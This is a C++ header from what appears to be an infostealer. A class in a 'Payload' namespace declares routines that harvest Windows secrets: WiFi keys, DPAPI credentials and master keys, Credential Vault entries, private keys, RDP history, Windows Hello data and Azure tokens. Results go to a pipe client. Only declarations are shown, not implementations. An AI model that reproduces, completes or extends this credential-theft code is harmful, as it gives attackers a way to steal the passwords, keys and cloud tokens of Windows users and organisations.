#pragma once
#include "pipe_client.hpp"
#include <vector>
#include <string>
#include <optional>

namespace Payload {

    struct ExtraSecret {
        std::string topic;           // e.g., "WiFi", "DPAPI_Credential", "Vault"
        std::string path;            // identifier (SSID, target name, file path)
        std::vector<uint8_t> encrypted_data;  // raw encrypted blob (empty if none)
        std::string related_dpapi;   // base64 of DPAPI master key (if applicable)
        std::string related_abe;     // base64 of ABE key (always empty for extras)
    };

    class ExtraExtractor {
    public:
        explicit ExtraExtractor(PipeClient& pipe);
        void CollectAll();

        // Retrieve collected secrets after CollectAll()
        const std::vector<ExtraSecret>& GetSecrets() const { return m_secrets; }

        // Access extracted master keys (base64 encoded)
        std::string GetUserMasterKeyBase64() const { return m_userMasterKeyBase64; }
        std::string GetMachineMasterKeyBase64() const { return m_machineMasterKeyBase64; }

    private:
        // Collection methods now store secrets instead of sending to pipe
        void CollectWiFi();
        void CollectDPAPICredentials();
        void CollectVault();
        void CollectRAS();
        void CollectPrivateKeys();
        void CollectLegacyApps();
        void CollectRDPHistory();
        void CollectRDPFiles();
        void CollectOutgoingRDP();
        void CollectUserMasterKeys();
        void CollectMachineMasterKeys();
        void CollectWindowsHello();
        void CollectAzureTokens();

        // Helper to add a secret
        void AddSecret(const std::string& topic, const std::string& path,
            const std::vector<uint8_t>& enc,
            const std::string& dpapiKeyBase64 = "");

        PipeClient& m_pipe;
        std::vector<ExtraSecret> m_secrets;

        // Stored master keys (base64)
        std::string m_userMasterKeyBase64;
        std::string m_machineMasterKeyBase64;
    };
}